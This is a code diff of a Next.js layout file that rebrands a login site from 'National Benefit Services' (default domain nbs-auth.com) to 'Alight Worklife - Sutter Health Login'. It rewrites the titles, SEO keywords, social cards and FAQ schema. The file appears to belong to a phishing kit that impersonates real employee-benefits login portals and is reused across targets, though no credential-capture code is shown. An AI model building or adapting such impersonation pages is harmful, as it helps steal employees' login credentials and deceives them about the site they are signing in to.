@@ -6,68 +6,37 @@ import "./globals.css";
 
 const geist = Geist({ subsets: ["latin"] });
 
-const SITE_BASE_URL = process.env.NEXT_PUBLIC_BASE_URL || 'https://nbs-auth.com'
-const SITE_DOMAIN = new URL(SITE_BASE_URL).hostname
-const SITE_BRAND = "National Benefit Services";
+const SITE_BASE_URL =
+  process.env.NEXT_PUBLIC_BASE_URL ||
+  "https://worklife.alight.com/ah-angular-afirst-web";
+const SITE_DOMAIN = new URL(SITE_BASE_URL).hostname;
+const SITE_BRAND = "Alight Worklife";
 
 export const metadata: Metadata = {
   metadataBase: new URL(SITE_BASE_URL),
   title: {
-    default: "National Benefit Services - Login",
-    template: "%s | National Benefit Services",
+    default: "Alight Worklife - Sutter Health Login",
+    template: "%s | Alight Worklife",
   },
   keywords: [
-    "National Benefit Services",
-    "employee benefits portal",
+    "Alight Worklife",
+    "Sutter Health",
+    "employee portal",
     "benefits login",
-    "FSA account",
-    "HSA account",
-    "COBRA continuation",
-    "benefits enrollment",
-    "benefits claims",
-    "participant login",
-    "new user registration",
-    "password reset",
-    "benefits administration",
-    "dependent care benefits",
-    "healthcare benefits",
-    "employer benefits portal",
-    "broker benefits",
-    "secure benefits login",
-    "benefits account management",
-    "benefits eligibility",
-    "benefits customer support",
-    
-    "nbsbenefits",
-    "national benefits services",
-    "national benefits",
-    "nbs login",
-    "National Benefit Services login",
-    "NBS Benefits login",
-    "nbs HSA administrator",
-    "nbs Flexible Spending Account (FSA) administrator",
-    "nbs COBRA administration services",
-    "nbs Health Reimbursement Arrangement (HRA) administrator",
-    "nbs Employee benefits administration",
-    "nbs 401(k) retirement plan administration",
-    "nbs Third-party benefits administrator (TPA)",
-    "nbs Employer benefits administration",
-    "nbs retirement plan administration",
-    "nbs third party administrator",
-    "nbs benefit administration",
-    "nbs COBRA administration",
-    "nbs 401k administration",
-    "nbs FSA administration",
-    "nbs HSA administration",
-    "nbs TPA benefits",
-    "nbs employee benefits administrator",
-    "nbs flexible benefit administration",
+    "secure sign in",
+    "worklife login",
+    "employee account access",
+    "benefits portal",
+    "account access",
+    "Sutter Health employee login",
+    "Alight Worklife sign in",
+    "worklife portal",
   ],
-  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through National Benefit Services.`,
+  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Sign in securely to the Sutter Health employee portal and access your account.`,
 
-  authors: [{ name: "National Benefit Services" }],
-  creator: "National Benefit Services",
-  publisher: "National Benefit Services",
+  authors: [{ name: "Alight Worklife" }],
+  creator: "Alight Worklife",
+  publisher: "Alight Worklife",
   applicationName: SITE_BRAND,
   referrer: "origin-when-cross-origin",
   robots: {
@@ -84,13 +53,13 @@ export const metadata: Metadata = {
   openGraph: {
     type: "website",
     locale: "en_US",
-    title: "National Benefit Services - Login",
-    description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through ${SITE_BRAND}.`,
+    title: "Alight Worklife - Sutter Health Login",
+    description: `${SITE_BRAND} – ${SITE_DOMAIN}. Sign in securely to the Sutter Health employee portal and access your account.`,
     siteName: SITE_BRAND,
     url: SITE_BASE_URL,
     images: [
       {
-        url: `${SITE_BASE_URL}/Nbs%20banner_new.png`,
+        url: `${SITE_BASE_URL}/favicon-32x32.png`,
         width: 1200,
         height: 630,
         alt: `${SITE_BRAND}`,
@@ -99,13 +68,13 @@ export const metadata: Metadata = {
   },
   twitter: {
     card: "summary",
-    title: "National Benefit Services - Login",
-    description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through ${SITE_BRAND}.`,
-    images: [`${SITE_BASE_URL}/Nbs%20banner_new.png`],
+    title: "Alight Worklife - Sutter Health Login",
+    description: `${SITE_BRAND} – ${SITE_DOMAIN}. Sign in securely to the Sutter Health employee portal and access your account.`,
+    images: [`${SITE_BASE_URL}/favicon-32x32.png`],
   },
   icons: {
-    icon: "/favicon.ico",
-    shortcut: "/favicon.ico",
+    icon: "/favicon-32x32.png",
+    shortcut: "/favicon-32x32.png",
     apple: "/apple-touch-icon.png",
   },
   category: "Business",
@@ -132,9 +101,9 @@ const organizationSchema = {
   "@type": "Organization",
   name: SITE_BRAND,
   url: SITE_BASE_URL,
-  logo: `${SITE_BASE_URL}/Nbs%20banner_new.png`,
+  logo: `${SITE_BASE_URL}/favicon-32x32.png`,
   description:
-    "National Benefit Services provides secure access to FSA, HSA, COBRA, and dependent care benefits through our employee benefits portal.",
+    "Alight Worklife provides secure access to the Sutter Health employee portal and account sign-in experience.",
   sameAs: [],
   contactPoint: {
     "@type": "ContactPoint",
@@ -149,34 +118,34 @@ const faqSchema = {
   mainEntity: [
     {
       "@type": "Question",
-      name: "How do I login to my National Benefit Services account?",
+      name: "How do I sign in to my Alight Worklife account?",
       acceptedAnswer: {
         "@type": "Answer",
-        text: "Visit the National Benefit Services participant portal and enter your username and password. Select your user role (Participant, Employer, Broker, or Administrator) and click LOGIN.",
+        text: "Visit the Alight Worklife sign-in page and enter your credentials to access the Sutter Health employee portal.",
       },
     },
     {
       "@type": "Question",
-      name: "What is FSA login and how do I access it?",
+      name: "What is the Alight Worklife portal used for?",
       acceptedAnswer: {
         "@type": "Answer",
-        text: "FSA (Flexible Spending Account) login allows you to manage your health and dependent care reimbursement accounts through the National Benefit Services portal.",
+        text: "The Alight Worklife portal provides secure account access and employee benefits information for Sutter Health users.",
       },
     },
     {
       "@type": "Question",
-      name: "How do I reset my National Benefit Services password?",
+      name: "How do I recover my Alight Worklife password?",
       acceptedAnswer: {
         "@type": "Answer",
-        text: "Click the forgot password link on the login page. Follow the verification steps and set a new password for your account.",
+        text: "Use the forgot password option on the sign-in page and follow the required verification steps to reset your password.",
       },
     },
     {
       "@type": "Question",
-      name: "What benefits can I manage through this employee benefits portal?",
+      name: "What can I manage through the Alight Worklife portal?",
       acceptedAnswer: {
         "@type": "Answer",
-        text: "You can manage FSA (health and dependent care), HSA, COBRA continuation coverage, and other employee benefits through your secure account.",
+        text: "You can manage account access and related employee benefits information through the secure Alight Worklife portal.",
       },
     },
   ],
@@ -203,9 +172,9 @@ export default function RootLayout({
           href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap"
           rel="stylesheet"
         />
-        <link rel="icon" href="/favicon.ico" />
-        <link rel="shortcut icon" href="/favicon.ico" />
-        <link rel="apple-touch-icon" href="/favicon.ico" />
+        <link rel="icon" href="/favicon-32x32.png" />
+        <link rel="shortcut icon" href="/favicon-32x32.png" />
+        <link rel="apple-touch-icon" href="/apple-touch-icon.png" />
       </head>
       <body className={`${geist.className} font-sans antialiased`}>
         {jsonLd.map((schema, idx) => (
